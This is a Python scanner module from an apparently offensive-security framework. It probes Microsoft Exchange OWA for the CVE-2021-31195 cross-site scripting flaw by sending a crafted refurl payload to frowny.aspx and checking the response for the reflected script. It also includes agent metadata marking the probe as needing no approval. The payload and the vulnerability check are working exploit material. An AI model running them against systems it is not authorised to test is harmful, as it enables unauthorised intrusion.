#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Microsoft Exchange Server, or OWA, is vulnerable to a cross-site scripting vulnerability in refurl parameter o."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Microsoft Exchange Server - Cross-Site Scripting Detection',
        'description': 'Microsoft Exchange Server, or OWA, is vulnerable to a cross-site scripting vulnerability in refurl parameter of frowny.asp.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'microsoft', 'exchange', 'owa', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html',
            'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-31195',
            'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-31195',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-31195',
    }

    def run(self):
        r = self.http_request(method="GET", path='/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\\&refurl=}}};alert(document.domain)//', allow_redirects=False)
        if not r or r.status_code != 500:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('alert(document.domain)//&et=ServerError', 'mail/bootr.ashx',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Microsoft Exchange Server - Cross-Site Scripting detected",
                path='/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\\&refurl=}}};alert(document.domain)//',
            )
            return True
        return False

